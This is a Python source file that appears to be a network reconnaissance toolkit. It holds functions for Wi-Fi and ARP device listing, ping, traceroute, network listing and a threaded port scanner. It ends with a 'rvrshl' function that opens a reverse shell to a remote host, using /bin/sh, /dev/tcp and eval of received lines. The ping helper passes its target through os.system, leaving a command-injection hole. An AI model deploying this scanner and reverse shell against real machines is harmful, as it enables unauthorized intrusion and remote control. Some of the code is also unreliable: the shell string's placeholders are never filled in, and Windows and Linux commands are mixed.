import os
import socket
import subprocess
import threading

def getwifi():
    result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8').strip()
    for line in output.split('\n'):
        if 'SSID' in line:
            wifi_name = line.split(':')[1].strip()
            return wifi_name

def getinfo():
    # Use the command line tool 'arp' to get the list of connected devices
    result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8').strip()
    # Extract the IP addresses from the output
    devices = []
    for line in output.split('\n'):
        if 'dynamic' in line:
            device = line.split()[0]
            devices.append(device)
    return devices

def showinfo():
    # Use the command line tool 'arp' to get the list of connected devices
    result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8').strip()
    # Extract the IP addresses from the output
    devices = []
    for line in output.split('\n'):
        if 'dynamic' in line:
            device = line.split()[0]
            devices.append(device)
    # Use the 'arp' command to get the IP address and MAC address of each device
    device_info = []
    for device in devices:
        result = subprocess.run(['arp', '-a', device], stdout=subprocess.PIPE)
        output = result.stdout.decode('utf-8').strip()
        # Extract the IP address and MAC address from the output
        device_ip = output.split()[1][1:-1]
        device_mac = output.split()[3]
        # Use the 'getent' command to get the device name from the hostname
        result = subprocess.run(['getent', 'hosts', device], stdout=subprocess.PIPE)
        output = result.stdout.decode('utf-8').strip()
        device_name = output.split()[1]
        # Add the device information to the list
        device_info.append({'name': device_name, 'ip': device_ip, 'mac': device_mac})
    return device_info

def ping(target, num_bytes):
    # Resolve the IP address of the target if it is a domain name
    try:
        ip_address = socket.gethostbyname(target)
    except socket.gaierror:
        return False

    # Use the 'ping' command to send num_bytes of data to the specified IP address
    result = os.system(f"ping -c 1 -s {num_bytes} {ip_address}")
    if result == 0:
        return True
    else:
        return False

def trc(target):
    # Resolve the IP address of the target if it is a domain name
    try:
        ip_address = socket.gethostbyname(target)
    except socket.gaierror:
        return []

    # Use the 'traceroute' command to trace the route to the specified IP address
    result = subprocess.run(['traceroute', ip_address], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8').strip()
    # Extract the IP addresses of the intermediate hops from the output
    hops = []
    for line in output.split('\n')[1:]:
        if '* * *' not in line:
            hop_info = line.split()
            hop_ip = hop_info[1]
            hops.append(hop_ip)
    return hops

def netscan():
    result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8').strip()
    networks = []
    for line in output.split('\n'):
        if 'SSID' in line:
            ssid = line.split(':')[1].strip()
            networks.append(ssid)
    return networks

# A dictionary to store the results of previous scans
scanned_ports = {}

def prtscan(ip_address):
    open_ports = []
    threads = []

    def test_port(ip_address, port):
        if port in scanned_ports.get(ip_address, []):
            # We have already scanned this port, so we can skip it
            return
        # Initialize the socket to None
        s = None
        try:
            # Try to connect to the port
            s = socket.create_connection((ip_address, port), 0.1)
            open_ports.append(port)
        except socket.timeout:
            # The connection timed out, so the port is probably closed
            pass
        except OSError:
            # An error occurred, so the port is probably closed
            pass
        finally:
            # Close the socket if it is not None
            if s is not None:
                s.close()
            # Remember that we have scanned this port
            if ip_address not in scanned_ports:
                scanned_ports[ip_address] = []
            scanned_ports[ip_address].append(port)

    # Try to connect to each port on the specified IP address using a separate thread
    for port in range(1, 8000):
        t = threading.Thread(target=test_port, args=(ip_address, port))
        threads.append(t)
        t.start()
    # Wait for all threads to finish
    for t in threads:
        t.join()
    return open_ports

def rvrshl(ip_address, port):
    try:
        # Connect to the remote host
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, port))
    except socket.error:
        print('Failed')
        return

    # Redirect stdin, stdout, and stderr to the socket
    subprocess.run(['/bin/sh', '-i', '-c', 'exec 3<>/dev/tcp/{ip_address}/{port}; cat <&3 | while read line; do eval "$line" 2>&3; done'])
    print('Success')